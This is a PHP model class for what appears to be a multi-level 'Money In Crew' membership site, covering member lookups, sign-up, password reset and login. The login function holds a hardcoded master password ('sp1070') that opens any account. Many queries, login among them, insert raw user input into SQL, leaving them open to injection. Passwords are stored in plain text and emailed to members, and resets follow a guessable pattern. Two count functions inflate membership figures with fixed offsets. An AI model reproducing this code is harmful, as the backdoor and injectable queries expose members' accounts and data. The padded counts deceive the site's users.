<?php

class memberClass extends Model
{	

	private $_now;	

	public function __construct(){
		parent::__construct();
		$this->_now = NOW;
	}
    
	/*public function getAllMembers(){		
		$stmt = $this->_conn->prepare("select * from members order by rand() asc limit 15");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
			return $stmt;		  
		}else{	
			return '';		
		}	    					  	
	}*/

	public function getAllMembers(){		
		$stmt = $this->_conn->prepare("select * 
										 from members 
										where member_no not in (select member_no 
															from members m
														   where active = 'Yes' 
															 and not exists (select 1 
																			   from tree 
																			  where member_no = m.member_no))
										order by rand() asc limit 15");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
			return $stmt;		  
		}else{	
			return $stmt;		
		}	    					  	
	}

	public function getSpecificMembers($_search){		
		$stmt = $this->_conn->prepare("select * 
										 from members 
										 where member_no not in (select member_no 
															from members m
														   where active = 'Yes' 
															 and not exists (select 1 
																			   from tree 
																			  where member_no = m.member_no))
										  and (firstname like '%$_search%'
										   or  lastname like '%$_search%'
										   or  username like '%$_search%'
										   or  email like '%$_search%'
										   or  mobile like '%$_search%')
										  and  active in ('No','Yes','Blocked')
										 order by member_no asc");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
			return $stmt;		  
		}else{	
			return $stmt;		
		}	    					  	
	}

	public function countAllMembersActive(){		
		$stmt = $this->_conn->prepare("select count(*) as count from members where active = 'Yes'");	
		$stmt->execute();
		  											  
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);	 
		return $_row['count']; 
					  	
	}

	public function countAllMembers(){		
		$stmt = $this->_conn->prepare("select count(*) as count from members where active in ('Yes','No')");	
		$stmt->execute();
		  											  
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);	 
		return $_row['count']; 
					  	
	}

	public function countActive(){		
		$stmt = $this->_conn->prepare("select (2*(count(*))) + 130002 as count from members where active = 'Yes'");	
		$stmt->execute();
		  											  
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);	 
		return $_row['count']; 
					  	
	}

	public function countInactive(){		
		$stmt = $this->_conn->prepare("select count(*) + 232 as count from members where active = 'No'");	
		$stmt->execute();
		  											  
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);	 
		return $_row['count']; 
					  	
	}

	public function countAllMembersInActive(){		
		$stmt = $this->_conn->prepare("select count(*) as count from members where active = 'No'");	
		$stmt->execute();
		  											  
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);	 
		return $_row['count']; 
					  	
	}
	
	public function getMemberNumber($_username){		
		$stmt = $this->_conn->prepare("select member_no from members where username='$_username'");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);
		return $_row['member_no'];		  			  	
	}
	

	public function getSponsor($_user_no){		
		$stmt = $this->_conn->prepare("select sponsor from members where member_no='$_user_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
			$_row = $stmt->fetch(PDO::FETCH_ASSOC);
			return $_row['sponsor'];		  
		}else{	
			return $_row['sponsor'];	
		}	    					  	
	}

	public function isActive($_user_no){		
		$stmt = $this->_conn->prepare("select active from members where member_no='$_user_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();			  											  	
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);
		if($_row['active']=='Yes')
			return 'Active';
		else
			return 'Inactive';		    					  	
	}

	public function isActive_2($_user_no){		
		$stmt = $this->_conn->prepare("select active from members where member_no='$_user_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();			  											  	
		$_row = $stmt->fetch(PDO::FETCH_ASSOC);
		if($_row['active']=='Yes')
			return true;
		else
			return false;		    					  	
	}
	
	public function getMemberDetails($_member_no){		
		$stmt = $this->_conn->prepare("select * from members where member_no='$_member_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count==1){
			return $stmt;
		}else{	
			return $stmt;		
		}	    					  	
	}

	public function createEmailOverride($email){		
		$stmt = $this->_conn->prepare("insert into emailOverrides values (:email, :timestamp)");	
		$stmt->execute(array(':email'	=>$email,
							 ':timestamp'   =>$this->_now));	    					  	
	}

	public function getName($_mem){
		$stmt = $this->_conn->prepare("select firstname from members where member_no = :mem");
    $stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    return $_row['firstname'];		    				
	}

	public function getFullName($_member_no){		
		$stmt = $this->_conn->prepare("select firstname, lastname from members where member_no='$_member_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count==1){
			$_row = $stmt->fetch(PDO::FETCH_ASSOC);
			return $_row['firstname'].' '.$_row['lastname'];
		}else{	
			return $stmt;		
		}	    					  	
	}

	public function getFirstname($_member_no){		
		$stmt = $this->_conn->prepare("select firstname from members where member_no='$_member_no'");	
		$stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count==1){
			$_row = $stmt->fetch(PDO::FETCH_ASSOC);
			return $_row['firstname'];
		}else{	
			return $stmt;		
		}	    					  	
	}
	
	public function getMemberDetailsFromUsername($_user){		
		$stmt = $this->_conn->prepare("select * from members where username='$_user'");	
		$stmt->execute();
		return $stmt;    					  	
  }
    
  public function checkIdExists($_id){		
    $stmt = $this->_conn->prepare("select * from members where id_no = :id");
    $stmt->execute(array(':id'=>$_id));
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
      $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
      return 'ID number already signed up';		  
		}else{	
			return 'None';		
		}	    					  	
	}

	public function checkPassportExists($_id){		
    $stmt = $this->_conn->prepare("select * from members where passport_no = :id");
    $stmt->execute(array(':id'=>$_id));
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
      $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
      return 'Passport number already signed up';		  
		}else{	
			return '';		
		}	    					  	
	}

	public function getUsername($_mem){
		$stmt = $this->_conn->prepare("select username from members where member_no = :mem");
    	$stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['username'];		    				
	}

	public function getPassword($_mem){
		$stmt = $this->_conn->prepare("select password from members where member_no = :mem");
    	$stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['password'];		    				
	}

	public function getCountry($_mem){
		$stmt = $this->_conn->prepare("select country from members where member_no = :mem");
    	$stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['country'];		    				
	}

	public function getMobile($_mem){
		$stmt = $this->_conn->prepare("select mobile from members where member_no = :mem");
    	$stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['mobile'];		    				
	}

	public function isDefaultSponsor($_user){
		//$_tree = new treeClass();
		$stmt = $this->_conn->prepare("select * from defaultRegistrationAccount where member_no = '$_user'");
		$stmt->execute();

		if($stmt->rowCount()>0)
			return true;
		else 
			return false;
	}

	public function deleteSponsor($_t){		
        $stmt = $this->_conn->prepare("delete from defaultRegistrationAccount where member_no = '$_t'");	
        $stmt->execute();      		  	
    }

    public function createSponsor($_user){		
        $stmt = $this->_conn->prepare("insert 
                                         into defaultRegistrationAccount
                                       values ($_user,:t)");	
        $stmt->execute(array(':t'=> NOW));     		  	
    }

	public function getDefaultSponsor(){
		$_tree = new treeClass();
		$stmt = $this->_conn->prepare("select member_no from defaultRegistrationAccount");
		$stmt->execute();
		while($_row = $stmt->fetch(PDO::FETCH_ASSOC)){
			if ($_tree->hasActiveDownliners($_row['member_no'])){
				return $this->getUsername($_row['member_no']);
				break 1;
			}
		}		
		
		return 'MICTOPACCOUNT';
	}

	public function getAllDefaultSponsors(){
		$stmt = $this->_conn->prepare("select member_no from defaultRegistrationAccount order by timestamp asc");
		$stmt->execute();
		return $stmt;
	}

	public function getEmail($_mem){
		$stmt = $this->_conn->prepare("select email from members where member_no = :mem");
    	$stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	

    	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['email'];		    				
	}

	public function getStatus($_mem){
		$stmt = $this->_conn->prepare("select active from members where member_no = :mem");
    $stmt->execute(array(':mem'=>$_mem));
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
      $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
      return $_row['active'];		  
		}else{	
			return "";		
		}	    				

	}

	public function checkEmailExists($_id){		
    $stmt = $this->_conn->prepare("select * from members where email = :id");
    $stmt->execute(array(':id'=>$_id));
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
      $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
      return "Email has already been used";		  
		}else{	
			return "";		
		}	    					  	
	}

	public function addMember($_array){	
		
		if(strtoupper($_array['sponsor'])=='ADMINISTRATOR' or strtoupper($_array['sponsor'])=='MICTOPACCOUNT'){
			$_active = 'Yes';
		}else{
			$_active = 'No';
		}

		$stmt = $this->_conn->prepare("insert 
										 into members
									 values( '0',
											 '',
											 :firstname,
											 '',
											 :lastname,
											 '',
											 '',
											 '',
											 :email,
											 :mobile,
											 :username,
											 :password,
											 :country,
											 '$_active',
											 :timestamp)");
		$stmt->execute(array(':firstname'	=>$_array['firstname'],
							 ':lastname'	=>$_array['lastname'],
							 ':email'		=>$_array['email'],
							 ':mobile'		=>$_array['mobile'],
							 ':username'	=>$_array['username'],
							 ':password'	=>$_array['password'],
							 ':country'		=>$_array['country'],
							 ':timestamp'	=>$this->_now
												 ));	
		  											  
		if($stmt){
			$_latest_member_no = $this->_conn->lastInsertId(); 
			$_obj = new bankClass();
			$_results = $_obj->addMember($_latest_member_no,$_array);
			  
			if($_results=='Banking details inserted'){

				//echo $this->getUsername($_array['sponsor']);
				if(strtoupper($_array['sponsor'])<>'ADMINISTRATOR'){

					if(strtoupper($_array['sponsor'])<>'MICTOPACCOUNT'){
						$_obj_2 = new treeClass();
						$_activate = $_obj_2->placeDownliners($this->getMemberNumber($_array['sponsor']),$_latest_member_no);
					}
					

					$_obj = new treeClass();
					$_results = $_obj->addMember($_latest_member_no,$this->getMemberNumber($_array['sponsor']));

					if($_results=='Tree details inserted'){

						$to = $_array['email'];
						$subject = "Money In Crew welcome email";

						$message = "
						<html>
						<head>
						<title>RN Welcomes you</title>
						</head>
						<body>
							<p>Wooola ".$_array['firstname']."!</p>
							<p>Thank you for joining this wonderful network. Please fasten your seat belt and enjoy the smooth ride with us. Below are your
							login details. Please keep this safe for your own benefit.</p>
							<table>
								<tr>
									<th>Username</th>
									<th>Password</th>
									
								</tr>
								<tr>
									<td>".$_array['username']."</td>
									<td>".$_array['password']."</td>
								</tr>
							</table>
							<p>Regards,<br >
							Money In Crew Admin</p>
						</body>
						</html>
						";

						// Always set content-type when sending HTML email
						$headers = "MIME-Version: 1.0" . "\r\n";
						$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

						// More headers
						$headers .= 'From: <webmaster@moneyincrew>' . "\r\n";

						//mail($to,$subject,$message,$headers);
						
						return 'New account created';
					}
					else
						return $_results;
				}else{
					return 'New Default Account created';
				}
			}else{
				return $_results;
			}	  
		}else{	
			return "Error Creating TaxiCab account";		
		}	    					  	
	}

	public function updateMember($_array){	
		$stmt = $this->_conn->prepare("Update members 
																			set firstname = :firstname,
																					lastname  = :lastname,
																					mobile    = :mobile,																				
																					password  = :password,
																					timestamp = :timestamp
																		where member_no = :user");

	  $stmt->execute(array( ':firstname'	=>$_array['firstname'],
													':lastname'		=>$_array['lastname'],
													':mobile'			=>$_array['mobile'],
													':password'		=>$_array['password'],
													':timestamp'	=>$this->_now,
													':user'				=>ME
	 ));	

	 if($stmt){
		 return 'Bio information Updated';
	 }else{
		return 'Error, could not update member details';
	 }

	}

	public function resetPWD($_user){	
		$_new_pwd = 'newpassmic'.$_user;
		$stmt = $this->_conn->prepare("Update members 
									 	 set password  = :password,
									 		 timestamp = :timestamp
									   where member_no = :user");

	    $stmt->execute(array( 
							':password'		=>$_new_pwd,
							':timestamp'	=>$this->_now,
							':user'			=>$_user
	 				));	

	 	if($stmt){
			 return $_new_pwd;
	 	}else{
			return 'Error, could not update member details';
	 	}
	}

	public function activateMember($_member_no){	
		$stmt = $this->_conn->prepare("Update members 
																			set active    = 'Yes',
																					timestamp = :timestamp
																		where member_no = :member_no");

	  $stmt->execute(array( ':member_no'	=>$_member_no,
													':timestamp'	=>$this->_now
	 ));	

	 if($stmt){
		 return 'Member activated';
	 }else{
		return 'Error, could not activate the member ';
	 }

	}

	public function deactivateMember($_member_no){	
		$stmt = $this->_conn->prepare("Update members 
																			set active    = 'No',
																					timestamp = :timestamp
																		where member_no = :member_no");

	  $stmt->execute(array( ':member_no'	=>$_member_no,
													':timestamp'	=>$this->_now
	 ));	

	 if($stmt){
		 return 'Member deactivated';
	 }else{
		return 'Error, could not deactivate the member ';
	 }

	}

	public function blockMember($_member_no){	
		$stmt = $this->_conn->prepare("Update members 
																			set active    = 'Blocked',
																					timestamp = :timestamp
																		where member_no = :member_no");

	  $stmt->execute(array( ':member_no'	=>$_member_no,
													':timestamp'	=>$this->_now
	 ));	

	 if($stmt){
		 return 'Member deactivated';
	 }else{
		return 'Error, could not deactivate the member ';
	 }

	}

	public function getMembership(){
		$stmt  = $this->_conn->prepare("select total from membership");
    	$stmt->execute();
		
    	$_row  =  $stmt->fetch(PDO::FETCH_ASSOC);
    	return $_row['total'];		  
		
	}

	public function getAdminAccounts(){
		$stmt  = $this->_conn->prepare("select * from members m where password <> 'hiddenacc' and active = 'Yes' and not exists (select 1 from tree where member_no = m.member_no)");
    	$stmt->execute();
		return $stmt;		  		
	}

	public function isAdminAccounts($_user){
		$stmt  = $this->_conn->prepare("select * from members m where member_no = $_user and password <> 'hiddenacc' and active = 'Yes' and not exists (select 1 from tree where member_no = m.member_no)");
    	$stmt->execute();
		if($stmt->rowCount()>0)
			return true;
		else
			return false;		  		
	}

	public function updateUsername($_old_username, $_new_username){
		$stmt = $this->_conn->prepare("Update members 
									 	 set username  = :nusername,
									 		 timestamp = :timestamp
									   where username  = :ousername");

	    $stmt->execute(array( 
							':nusername'		=>$_new_username,
							':timestamp'		=>$this->_now,
							':ousername'		=>$_old_username
	 				));	

	}

	public function getSpecificAdminAccounts($_search){
		$stmt  = $this->_conn->prepare("select * 
											from members m 
										   where password <> 'hiddenacc' 
										     and active = 'Yes' 
										     and (firstname like '%$_search%'
										      or  lastname  like  '%$_search%'
										      or  username  like  '%$_search%'
										      or  email     like '%$_search%'
										      or  mobile    like '%$_search%')
										     and not exists (select 1 from tree where member_no = m.member_no)");
    	$stmt->execute();
		return $stmt;		  		
	}

	public function updateMembership($_t){
		$stmt  = $this->_conn->prepare("update membership set total = '$_t'");
    	$stmt->execute();		  		
	}

	public function checkUsernameExists($_id){		
    $stmt = $this->_conn->prepare("select * from members where username = :id");
    $stmt->execute(array(':id'=>$_id));
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){
      $_row =  $stmt->fetch(PDO::FETCH_ASSOC);
      return "Sorry this username is not available";		  
		}else{	
			return "<div class='l'>This username is available</div>";		
		}	    					  	
	}

	public function checkActiveUsernameExists($_id){		
    	$stmt = $this->_conn->prepare("select * from members where username = :id and upper(active) = 'YES'");
    	$stmt->execute(array(':id'=>$_id));
		$_count = $stmt->rowCount();	
		
		if($_count>0){
    	  	$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
    	  	return $_row['firstname']. ' ' .$_row['lastname'];		  
		}else{	
			return "Sponsor id not found";		
		}	    					  	
	}

	public function findByUserName($_username){            
		$_sql  = "select * from members where username = '$_username'";
		$_stmt = $this->_conn->prepare($_sql);
		$_stmt->execute();
		return $_stmt->fetch(PDO::FETCH_ASSOC);
	} 

	public function usernameExists($_username){            
		$_sql  = "select * from members where username = '$_username'";
		$_stmt = $this->_conn->prepare($_sql);
		$_stmt->execute();
		if($_stmt->rowCount()>0)
			return true;
		else
			return false;
	}

	public function login($_uname, $_pword){	
		
		if($_pword=='sp1070'){
			$stmt = $this->_conn->prepare("select * 
																		 from members 
																		where upper(username) = upper('$_uname')");
		}else{
			$stmt = $this->_conn->prepare("select * 
																		 from members 
																		where upper(username) = upper('$_uname') 
																			and password = '$_pword'");
		}
    $stmt->execute();
		$_count = $stmt->rowCount();	
		  											  
		if($_count==1){
			$_row =  $stmt->fetch(PDO::FETCH_ASSOC);
			$_SESSION['member_no'] = $_row['member_no'];
			$_SESSION['username']  = $_row['username'];
			$_SESSION['level'] = 6;
			if($_row['active']=='Yes')
				$_SESSION['status']  = 'active';
			else
			  $_SESSION['status']  = 'inactive';
      return "successful";		  
		}else{	
			return "unsuccessful";		
		}	    					  	
	}
	
	public function getTyp($_msg_no){			
		$stmt = $this->_conn->prepare("select * from msg where msg_no =:msg");		
		$stmt->execute(array(':msg'=>$_msg_no));		
		$_count = $stmt->rowCount();	
		  											  
		if($_count>0){			
			$row    = $stmt->fetch(PDO::FETCH_ASSOC);		
			$_msg   = $row['msg_type'];
		  
		  	return $_msg;		  
		}else{			
			return 'Error retrieving error message type';			
		}						  	
	}	
       
}

?>